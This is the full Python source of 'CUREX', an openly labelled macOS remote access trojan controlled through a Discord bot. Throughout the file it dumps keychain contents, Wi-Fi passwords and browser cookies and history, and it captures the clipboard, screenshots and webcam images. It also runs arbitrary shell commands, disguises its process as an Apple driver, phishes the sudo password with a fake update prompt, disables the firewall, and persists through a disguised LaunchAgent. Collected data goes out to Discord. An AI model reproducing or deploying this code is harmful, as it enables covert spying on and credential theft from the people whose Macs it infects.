##### CUREX V1.0 - COMPLETE MACOS RAT #####
##### Discord C2 + All Exfiltration & Control Features #####

import discord
import asyncio
import os
import subprocess
import platform
import socket
import time
import requests
import sys
import zipfile
import io
import json
import getpass
import shutil
import sqlite3
import browser_cookie3
from datetime import datetime
from discord.ext import commands
from PIL import ImageGrab
import uuid
import ctypes
import plistlib
import pytz
import pyperclip
import logging
from Quartz import CGEventTapCreate, kCGEventKeyDown
from AppKit import NSPasteboard, NSStringPboardType

# ===== CONFIGURATION =====
DISCORD_BOT_TOKEN = "Your_Bot_Token_Here"
CHANNEL_ID = YOUR_CHANNEL_ID_HERE
COMMAND_PREFIX = "!"
MAX_UPLOAD_SIZE = 8 * 1024 * 1024  # 8MB
STEALTH_MODE = True
EXFIL_METHOD = "discord"

# ===== GLOBALS =====
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=discord.Intents.all())
current_directory = os.getcwd()
session_id = os.urandom(8).hex()
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
keylogger_active = False
clipboard_log = []

# ===== UTILITIES =====
def is_macOS():
    return platform.system() == 'Darwin'

def obfuscate_command(cmd):
    return cmd.replace(" ", "$'\x20'").replace("/", "$'\x2F'")

async def send_output(ctx, output):
    if len(output) > 1900:
        with io.StringIO(output) as f:
            await ctx.send(file=discord.File(f, filename="output.txt"))
    else:
        await ctx.send(f"```\n{output}\n```")

async def send_file(ctx, file_path):
    with open(file_path, 'rb') as f:
        await ctx.send(file=discord.File(f))

def hide_process():
    try:
        libc = ctypes.CDLL(None)
        argv = ctypes.POINTER(ctypes.c_char_p)()
        libc._NSGetArgv.restype = ctypes.POINTER(ctypes.c_char_p)
        argv = libc._NSGetArgv()
        argv[0] = ctypes.create_string_buffer(b"com.apple.audio.driver")
        return True
    except:
        return False

# ===== DATA EXFILTRATION =====
def get_keychain_items():
    try:
        result = subprocess.run(
            ["security", "dump-keychain"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
    except Exception as e:
        return f"Keychain access failed: {str(e)}"

def get_wifi_passwords():
    try:
        networks = subprocess.run(
            ["networksetup", "-listpreferredwirelessnetworks", "en0"],
            stdout=subprocess.PIPE,
            text=True
        ).stdout.splitlines()[1:]
        
        results = []
        for network in networks:
            network = network.strip()
            if network:
                password = subprocess.run(
                    ["security", "find-generic-password",
                     "-ga", network, "-D", "AirPort network password"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                if password.returncode == 0:
                    pw = password.stderr.split("password: ")[1].split("\n")[0]
                    results.append(f"{network}: {pw}")
        return "\n".join(results) if results else "No WiFi passwords found"
    except Exception as e:
        return f"WiFi password error: {str(e)}"

def get_browser_data():
    browsers = ["chrome", "safari", "firefox", "edge", "opera"]
    results = {}
    
    for browser in browsers:
        try:
            if browser == "chrome":
                cj = browser_cookie3.chrome()
            elif browser == "safari":
                cj = browser_cookie3.safari()
            elif browser == "firefox":
                cj = browser_cookie3.firefox()
            elif browser == "edge":
                cj = browser_cookie3.edge()
            elif browser == "opera":
                cj = browser_cookie3.opera()
                
            cookies = []
            for cookie in cj:
                cookies.append({
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path
                })
            results[browser] = cookies
            
            # Chrome history extraction
            if browser == "chrome":
                history_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/History")
                if os.path.exists(history_path):
                    temp_db = os.path.join(current_directory, "temp_history.db")
                    shutil.copy2(history_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                    results[browser]["history"] = cursor.fetchall()
                    conn.close()
                    os.remove(temp_db)
                    
        except Exception as e:
            results[browser] = f"Error: {str(e)}"
    return results

def get_clipboard():
    try:
        pb = NSPasteboard.generalPasteboard()
        return pb.stringForType_(NSStringPboardType)
    except:
        return "Clipboard access error"

# ===== SYSTEM CONTROL =====
def elevate_privileges():
    try:
        script = """#!/bin/bash
echo "System Update requires admin privileges:"
read -s password
echo "$password"
"""
        with open("/tmp/.elevate.sh", "w") as f:
            f.write(script)
        os.chmod("/tmp/.elevate.sh", 0o755)
        
        password = subprocess.run(
            ["/tmp/.elevate.sh"],
            stdout=subprocess.PIPE,
            text=True
        ).stdout.strip()
        
        result = subprocess.run(
            f"echo '{password}' | sudo -S whoami",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        os.remove("/tmp/.elevate.sh")
        return "root" in result.stdout
    except:
        return False

def disable_firewall():
    try:
        subprocess.run(
            ["sudo", "defaults", "write", 
             "/Library/Preferences/com.apple.alf", "globalstate", "-int", "0"],
            check=True
        )
        subprocess.run(
            ["sudo", "launchctl", "unload", 
             "/System/Library/LaunchDaemons/com.apple.alf.agent.plist"],
            check=True
        )
        return True
    except:
        return False

# ===== MAIN COMMANDS =====
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    if STEALTH_MODE:
        hide_process()
    channel = bot.get_channel(CHANNEL_ID)
    info = {
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os_version": platform.mac_ver()[0],
        "ip": socket.gethostbyname(socket.gethostname()),
        "session_id": session_id
    }
    await channel.send(f"```✅ Agent connected\n{json.dumps(info, indent=2)}```")

@bot.command(name='exfil')
async def exfil_data(ctx, category="all"):
    """Master exfiltration command"""
    if category in ["all", "creds"]:
        await ctx.invoke(bot.get_command('keychain'))
        await ctx.invoke(bot.get_command('wifi'))
    if category in ["all", "browser"]:
        await ctx.invoke(bot.get_command('browser'))
    if category in ["all", "clipboard"]:
        await ctx.send(f"```Clipboard:\n{get_clipboard()}```")

@bot.command(name='keychain')
async def dump_keychain(ctx):
    """Dump macOS keychain contents"""
    await send_output(ctx, get_keychain_items())

@bot.command(name='wifi')
async def get_wifi(ctx):
    """Get saved WiFi passwords"""
    await send_output(ctx, get_wifi_passwords())

@bot.command(name='browser')
async def browser_data(ctx):
    """Extract browser cookies/history"""
    data = get_browser_data()
    with open("browser_data.json", "w") as f:
        json.dump(data, f, indent=2)
    await send_file(ctx, "browser_data.json")
    os.remove("browser_data.json")

@bot.command(name='shell')
async def shell_command(ctx, *, command):
    """Execute shell commands"""
    try:
        if command.startswith('obfuscate '):
            command = obfuscate_command(command[10:])
            
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=current_directory
        )
        
        stdout, stderr = await process.communicate()
        output = stdout.decode() if stdout else stderr.decode()
        await send_output(ctx, output if output else "Command executed with no output")
    except Exception as e:
        await ctx.send(f"Error: ```{str(e)}```")

@bot.command(name='screenshot')
async def take_screenshot(ctx):
    """Take a screenshot"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        screenshot_path = f"screenshot_{timestamp}.png"
        ImageGrab.grab().save(screenshot_path)
        await send_file(ctx, screenshot_path)
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f"Error: ```{str(e)}```")

@bot.command(name='webcam')
async def capture_webcam(ctx):
    """Capture webcam image"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        webcam_path = f"webcam_{timestamp}.jpg"
        
        if os.path.exists("/usr/local/bin/imagesnap"):
            subprocess.run(["/usr/local/bin/imagesnap", "-w", "1", webcam_path], check=True)
        elif os.path.exists("/usr/local/bin/fswebcam"):
            subprocess.run(["/usr/local/bin/fswebcam", "-r", "1280x720", "--no-banner", webcam_path], check=True)
        else:
            await ctx.send("Install imagesnap or fswebcam first")
            return
        
        await send_file(ctx, webcam_path)
        os.remove(webcam_path)
    except Exception as e:
        await ctx.send(f"Error: ```{str(e)}```")

@bot.command(name='persist')
async def install_persistence(ctx):
    """Install persistence via LaunchAgent"""
    try:
        user_home = os.path.expanduser("~")
        agent_name = "com.apple.systemupdate"
        plist_path = f"{user_home}/Library/LaunchAgents/{agent_name}.plist"
        script_path = f"{user_home}/.systemupdate.py"
        
        with open(__file__, 'r') as f:
            script_content = f.read()
        
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{agent_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>AbandonProcessGroup</key>
    <true/>
</dict>
</plist>"""
        
        os.makedirs(os.path.dirname(plist_path), exist_ok=True)
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        
        subprocess.run(["launchctl", "load", plist_path], check=True)
        await ctx.send("✅ Persistence installed")
    except Exception as e:
        await ctx.send(f"Error: ```{str(e)}```")

@bot.command(name='exit')
async def exit_bot(ctx):
    """Terminate the connection"""
    await ctx.send("`🛑 Disconnecting...`")
    await bot.close()

if __name__ == "__main__":
    if not is_macOS():
        print("Error: macOS only")
        sys.exit(1)
    
    print("Starting CUREX with all features...")
    bot.run(DISCORD_BOT_TOKEN)
